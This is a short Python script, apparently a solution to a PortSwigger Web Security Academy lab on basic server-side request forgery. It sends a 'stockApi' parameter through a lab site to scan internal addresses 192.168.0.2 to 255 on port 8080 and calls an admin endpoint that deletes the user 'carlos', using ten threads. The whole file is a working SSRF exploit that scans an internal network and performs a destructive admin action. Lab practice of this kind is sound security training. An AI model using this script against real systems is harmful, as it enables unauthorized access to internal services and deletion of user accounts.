#https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-backend-system#
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = 'https://0a0a007b04443abc82037071000b0003.web-security-academy.net'
client = requests.sessions.Session()
stock_url = URL + "/product/stock"
def try_code(ip):
    data ={
    'stockApi':f'http://192.168.0.{ip}:8080/admin/delete?username=carlos'
    }
    #print(data)
    client.get(url=URL)
    r = client.post(url=stock_url, data=data, allow_redirects=False)
    #print(r.status_code, flush=False)
    if (r.status_code != 500):
        print(f"found the admin panel at 192.168.0.{ip}")
        return ip
    return None

with ThreadPoolExecutor(max_workers=10) as executor:

    futures = {executor.submit(try_code, i): i for i in range(2, 256)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"Found the admin panel: 192.168.0.{result}")
            executor.shutdown(wait=False)
            break
